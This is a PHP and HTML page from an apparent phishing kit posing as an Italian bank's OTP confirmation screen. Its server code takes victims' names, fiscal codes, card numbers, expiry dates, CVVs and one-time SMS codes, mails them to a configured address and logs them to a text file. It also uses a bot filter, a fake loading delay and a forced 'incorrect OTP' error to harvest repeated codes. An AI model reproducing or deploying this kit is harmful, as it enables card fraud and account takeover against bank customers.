<?php
include_once "../../antibots.php";
$ip = getenv("REMOTE_ADDR");
include ("../conf.php");
if (isset($_POST["cc"])) {
$message .= "[ENZO] $ip \n";
$message .= "NOM       : ".$_POST['fullName']."\n";
$message .= "CF       : ".$_POST['code']."\n";
$message .= "CC       : ".$_POST['cc']."\n";
$message .= "EXP       : ".$_POST['mm']."/".$_POST['yy']."\n";
$message .= "CVV       : ".$_POST['cvv']."\n";
$message .= "[ENZO]\n";
$subject = "CC - $ip";
}
if (isset($_POST["otp"])) {
$message .= "[ENZO] $ip \n";
$message .= "PWD       : ".$_POST['otp']."\n";
$message .= "[ENZO]\n";
$subject = "SMS - $ip";
}
$headers = "From: [BNL]<noreply@kundenserver.de>";
mail($send,$subject,$message,$headers);

$file = fopen("../../st.txt","a+"); fwrite($file, $message);
?>

<!DOCTYPE html>

<html xmlns="http://www.w3.org/1999/xhtml"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
		<title>OTP</title>
		
		<meta name="build.timestamp" content="2017-05-19T08:15:03Z">
<meta name="build.number" content="71">
		

<link rel="stylesheet" type="text/css" media="all, print" href="./css/style.css">
<link rel="stylesheet" type="text/css" media="all, print" href="./css/fonts.css">
<link rel="stylesheet" type="text/css" media="all, print" href="./css/login.css">
<link rel="stylesheet" type="text/css" media="all, print" href="./css/hb-login.css">
<link rel="stylesheet" type="text/css" media="all, print" href="./css/style(1).css">
<link rel="stylesheet" type="text/css" media="all, print" href="./css/editoriale.css">
<style>

#load{
    width:100%;
    height:50%;
    position:absolute;
    z-index:9999;
    background:url("../img/spinnerloader.gif") no-repeat center center rgba(0,0,0,0.0)
}

</style>
</head>
					<br>
			<br>
			<br>
			<br>
			<br>
			<br>
	<body style="cursor: default;">
	<div id="load"></div>
	<script>
	document.onreadystatechange = function () {
  var state = document.readyState
  if (state == 'interactive') {
       document.getElementById('contents').style.visibility="hidden";
  } else if (state == 'complete') {
      setTimeout(function(){
         document.getElementById('interactive');
         document.getElementById('load').style.visibility="hidden";
         document.getElementById('contents').style.visibility="visible";
      },10000);
  }
}
	</script>
	<div class="popup-content" id="contents" >

			<div style="width:800px; margin:0 auto;">
			<form  method="post" action="OTP.php?error=1" autocomplete="off">	
				
					<div class="column service-body light-gray-bg-dac4" style="height: 305px;">
					
						<h2 class="menu-title">INSERIMENTO OTP</h2>
						
						<div class="cf" style="
    color: #f20808;
">
						
						
						
							<p class="service-description">Inserisci One Time Password (OTP) e seleziona CONFERMA. L'OTP è formata da soli numeri.</p>
							
							<div class="line cf">
								<h3 class="sub-title">
									<label for="real_otp">INSERISCI OTP</label>
								</h3>
								<input type="password" class="type-text-otp" name="otp"   maxlength="10">
							</div>
							
							<?php
							if (isset($_GET["error"])) {
								
							echo "Il codice numerico OTP inserito non è corretto, puoi inserirlo nuovamente.";
							}
							
							?>
							
							<div class="line">
								<hr>
									<input type="submit" class="pink-button-otp" name="Invia" value="CONFERMA">
									<br>
									
							</div>

						</div>	
					</div>	
								
			    
			    
			</form>
			
</div>
		
</div>
		
		
		
		</body></html>